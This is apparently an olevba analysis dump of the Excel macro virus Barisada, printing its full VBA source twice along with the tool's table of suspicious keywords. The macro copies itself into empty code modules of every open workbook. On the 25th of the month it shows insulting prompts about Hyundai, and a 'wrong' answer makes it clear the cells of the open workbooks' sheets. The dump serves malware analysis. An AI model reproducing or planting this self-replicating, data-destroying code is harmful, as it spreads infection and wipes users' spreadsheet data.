olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Barisada.t.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Barisada.t.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)

Flag = False
 
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> 0 Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 


dday = Day(Now)

If dday = 25 Then Flag = True

If Flag = True Then
  v1 = MsgBox("Question : Hyundai Unicorns left from Incheon, What do you think of it? " & vbCr & _
  "Answer : Hyundai is SOB ", vbYesNo, "1st Qusetion")
  
  If v1 = vbYes Then MsgBox "Good! You're pretty good guy!!", vbOKOnly, "Excellent!"
  If v1 = vbNo Then
     MsgBox "Oh! no, Next question is last time for you", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("We do not buy Hyundai's product, is it right?", vbYesNo, "If you have wrong answer, you will have punishment.")
     If v2 = vbYes Then MsgBox "You got it!", vbOKOnly, "You have right answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You are SOB, too."
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If


End Sub



































































-------------------------------------------------------------------------------
VBA MACRO Sheet111.cls 
in file: Virus.MSExcel.Barisada.t.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)

Flag = False
 
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> 0 Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 


dday = Day(Now)

If dday = 25 Then Flag = True

If Flag = True Then
  v1 = MsgBox("Question : Hyundai Unicorns left from Incheon, What do you think of it? " & vbCr & _
  "Answer : Hyundai is SOB ", vbYesNo, "1st Qusetion")
  
  If v1 = vbYes Then MsgBox "Good! You're pretty good guy!!", vbOKOnly, "Excellent!"
  If v1 = vbNo Then
     MsgBox "Oh! no, Next question is last time for you", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("We do not buy Hyundai's product, is it right?", vbYesNo, "If you have wrong answer, you will have punishment.")
     If v2 = vbYes Then MsgBox "You got it!", vbOKOnly, "You have right answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You are SOB, too."
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If


End Sub




































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

